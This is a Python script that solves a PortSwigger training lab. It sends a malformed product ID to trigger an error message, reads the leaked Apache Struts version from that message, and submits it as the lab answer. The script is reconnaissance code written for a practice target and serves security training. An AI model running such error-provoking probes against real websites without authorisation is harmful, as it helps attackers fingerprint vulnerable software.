#!/usr/bin/env python3
# Lab: Information disclosure in error messages
# Lab-Link: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages
# Difficulty: APPRENTICE
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    r = requests.get(f'{host}/product?productId=1x')
    if 'Apache Struts 2 2.3.31' not in r.text:
        print(f'[-] Failed to obtain vulnerable version of framework')
        sys.exit(-2)
    print(f'[+] Found vulnerable version of Apache Struts 2: 2.3.31')

    data = {'answer': '2.3.31'}
    r = requests.post(f'{host}/submitSolution', data=data)
    if '{"correct":true}' in r.text:
        print(f'[+] Correct version sumbitted, lab solved')
    else:
        print(f'[-] Failed to solve lab')


if __name__ == "__main__":
    main()
